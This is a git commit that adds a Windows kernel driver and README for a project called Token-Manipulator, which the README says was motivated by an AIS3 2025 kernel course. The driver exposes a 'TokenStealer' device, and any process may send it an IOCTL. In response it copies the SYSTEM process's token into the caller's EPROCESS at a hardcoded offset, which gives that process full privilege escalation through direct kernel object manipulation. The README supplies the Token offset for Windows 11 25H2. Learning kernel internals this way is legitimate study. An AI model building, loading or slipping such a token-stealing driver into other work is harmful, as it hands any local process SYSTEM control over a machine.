7d1a96aab48cde717d343de9aa06a7ed664b1d67
SoWiEee <kawiisowieee@gmail.com>
2026-02-09 22:11:10 +0800

    Project Init

---
+++ Driver.c
@@ -0,0 +1,97 @@
+﻿#include <ntifs.h>
+
+// IOCTL Code
+#define IOCTL_STEAL_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+#define TOKEN_OFFSET 0x248 
+
+void DriverUnload(PDRIVER_OBJECT pDriverObject) {
+    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\TokenStealer");
+    IoDeleteSymbolicLink(&symLink);
+    IoDeleteDevice(pDriverObject->DeviceObject);
+    DbgPrint("[-] Driver Unloaded.\n");
+}
+
+NTSTATUS StealTokenHandler() {
+    PEPROCESS CurrentProcess = NULL;
+    PEPROCESS SystemProcess = NULL;
+    NTSTATUS status;
+
+    // get system process handle
+    status = PsLookupProcessByProcessId((HANDLE)4, &SystemProcess);
+    if (!NT_SUCCESS(status)) {
+        return status;
+    }
+
+    // get caller process handle
+    CurrentProcess = PsGetCurrentProcess();
+
+    // find token address
+    UINT64* pSystemToken = (UINT64*)((UINT64)SystemProcess + TOKEN_OFFSET);
+    UINT64* pCurrentToken = (UINT64*)((UINT64)CurrentProcess + TOKEN_OFFSET);
+
+    // DKOM (Direct Kernel Object Manipulation)
+	// overwrite current process token with system process token
+    DbgPrint("[*] Old Token: %llx\n", *pCurrentToken);
+    *pCurrentToken = *pSystemToken;
+    DbgPrint("[*] New Token (Stolen): %llx\n", *pCurrentToken);
+
+    ObDereferenceObject(SystemProcess);
+
+    return STATUS_SUCCESS;
+}
+
+// IOCTL handler
+NTSTATUS DriverDispatch(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
+    PIO_STACK_LOCATION pIoStackLocation = IoGetCurrentIrpStackLocation(pIrp);
+    NTSTATUS status = STATUS_SUCCESS;
+
+    switch (pIoStackLocation->MajorFunction) {
+    case IRP_MJ_CREATE:
+    case IRP_MJ_CLOSE:
+        break;
+    case IRP_MJ_DEVICE_CONTROL:
+        if (pIoStackLocation->Parameters.DeviceIoControl.IoControlCode == IOCTL_STEAL_TOKEN) {
+            DbgPrint("[+] IOCTL Received. Starting Token Stealing...\n");
+            status = StealTokenHandler();
+        }
+        break;
+    default:
+        status = STATUS_INVALID_DEVICE_REQUEST;
+        break;
+    }
+
+    pIrp->IoStatus.Status = status;
+    pIrp->IoStatus.Information = 0;
+    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
+    return status;
+}
+
+NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath) {
+    UNREFERENCED_PARAMETER(pRegistryPath);
+    DbgPrint("[+] Driver Loaded!\n");
+
+    // unload function
+    pDriverObject->DriverUnload = DriverUnload;
+
+    // IRP function
+    pDriverObject->MajorFunction[IRP_MJ_CREATE] = DriverDispatch;
+    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverDispatch;
+    pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDispatch;
+
+    // create driver object
+    UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\TokenStealer");
+    PDEVICE_OBJECT pDeviceObject;
+    NTSTATUS status = IoCreateDevice(pDriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pDeviceObject);
+
+    if (!NT_SUCCESS(status)) return status;
+
+    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\TokenStealer");
+    status = IoCreateSymbolicLink(&symLink, &devName);
+
+    if (!NT_SUCCESS(status)) {
+        IoDeleteDevice(pDeviceObject);
+    }
+
+    return status;
+}
--- README.md
+++ README.md
@@ -1,2 +1,13 @@
 # Token-Manipulator
+
 A practical tool motivated by AIS3 2025 Windows Kernel course.
+
+# 1. Token Stealer
+
+## Windows 25H2 EPROCESS
+
+- [_EPROCESS structure](https://www.vergiliusproject.com/kernels/x64/windows-11/25h2/_EPROCESS)
+
+```cpp
+struct _EX_FAST_REF Token;                              // 0x248
+```
